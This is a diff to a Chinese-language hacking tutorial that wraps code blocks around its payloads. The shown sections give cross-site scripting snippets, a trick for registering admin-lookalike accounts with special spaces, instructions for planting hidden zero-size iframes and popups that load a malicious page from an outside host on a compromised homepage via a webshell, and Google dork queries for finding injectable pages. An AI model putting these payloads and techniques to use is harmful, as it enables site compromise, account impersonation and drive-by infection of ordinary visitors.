@@ -45,9 +45,12 @@ PHP后门，如之前爆出的DISZ漏洞，在一个PHP网站后面加C.PHP,如�
 15，〓跨站脚本攻击〓
 跨站（CSS），被动攻击，现在需要更多的思路和经验了
 三段经典跨站代码
+
+```
 <script>alert("跨站开始")</script>
 <script>alert("document.cookie")</script>
 <script>window.open(http://www.hackgirl.net)</script>
+```
 16〓特殊空格〓
 利用TAB制作的特殊空格，然后注册时输入空格，加管理名字，随便在网站上找个斑竹，或者管理的名字，这样来注册，有时自己注册的这个也会变成管理员
 17，〓改主页〓
@@ -55,12 +58,15 @@ PHP后门，如之前爆出的DISZ漏洞，在一个PHP网站后面加C.PHP,如�
 18，〓挂马〓
 首先在WEBSHELL里，建立一个文本，改为1.htm,接下来在主页最下面挂
 两段经典挂马代码
+```html
 <html>
 <iframe src="http://www.xxxx.com/2.htm" width="0" height="0" frameborder="0"></iframe>
 </html>
+
 <SCRIPT language=javascript>         
 window.open("http://www.xxx.com/2.htm","","toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=no,width=1,height=1");   
 </script>
+```
 19 〓 GOOGLE BACK语句〓（很多）
 inurl:asp?id=    ,inurl:show.asp  ,inurl:went.asp ,inurl:jsp?id=,inurl:php?id=
 20,〓自寻漏洞〓
